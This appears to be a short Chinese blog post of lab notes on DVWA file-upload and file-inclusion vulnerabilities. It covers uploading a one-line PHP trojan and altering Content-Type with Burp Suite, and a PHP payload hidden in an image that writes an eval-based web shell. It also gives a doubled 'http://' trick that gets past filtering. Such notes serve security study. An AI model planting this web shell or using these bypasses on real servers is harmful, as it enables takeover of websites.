---
title: Web文件上传与包含漏洞
author: 阿航
date: 2020-9-26 18:30:00 +0800
categories: [网络安全,Web]
tags: web安全


---



#### 文件上传漏洞:

- low 无验证文件格式，直接上传一句话木马。

- medium 限制jpeg格式，浏览器设置代理(本地ip或者其它)，用burp-suite拦截文件上传请求，修改content-type的值。

- high 通过文件后缀名来限制上传文件类型。

  ------

  

#### 文件包含漏洞：

- 本地文件包含`(LFI) e.g.`   ?page=`index.php` 等等

  1.`low`   通过`edjpgom` 工具将

  ```
  <?fputs(fopen("shell20.php","w"),'<?php eval($_POST[yangge]);?>') ?>
  ```

  代码写入图片中，先上传图片再通过文件包含生成`shell20.php` 文件,菜刀连接此文件获取`webshell` 。

  2.`medium` 中安全级别， 会删除`http`://, 此时需写成`hthttp://tp://`形式。
  3.`high` 将包含文件名写死。

- 远程文件包含`(RFI) e.g.`  ？page=`/www.baidu.com/var/dvw`等。

  ![image-20200929192717013](C:\Users\lxh\AppData\Roaming\Typora\typora-user-images\image-20200929192717013.png

  ------


